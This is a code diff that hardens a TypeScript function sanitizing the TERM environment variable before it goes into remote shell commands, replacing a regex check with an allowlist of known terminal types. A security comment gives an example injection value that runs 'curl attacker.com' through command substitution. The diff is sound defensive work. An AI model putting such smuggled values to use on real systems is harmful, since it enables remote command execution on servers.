@@ -337,11 +337,26 @@ export async function promptSpawnNameShared(cloudLabel: string): Promise<void> {
   logInfo(`Using resource name: ${kebab}`);
 }
 
+/** Known-safe TERM values — defense-in-depth allowlist. */
+const SAFE_TERMS = new Set([
+  "xterm-256color",
+  "xterm",
+  "screen-256color",
+  "screen",
+  "tmux-256color",
+  "tmux",
+  "linux",
+  "vt100",
+  "vt220",
+  "dumb",
+]);
+
 /** Sanitize TERM value before interpolating into shell commands.
  *  SECURITY: Prevents shell injection via malicious TERM env vars
- *  (e.g., TERM='$(curl attacker.com)' would execute on the remote server). */
+ *  (e.g., TERM='$(curl attacker.com)' would execute on the remote server).
+ *  Uses an explicit allowlist of known-safe values instead of a regex. */
 export function sanitizeTermValue(term: string): string {
-  if (/^[a-zA-Z0-9._-]+$/.test(term)) {
+  if (SAFE_TERMS.has(term)) {
     return term;
   }
   return "xterm-256color";
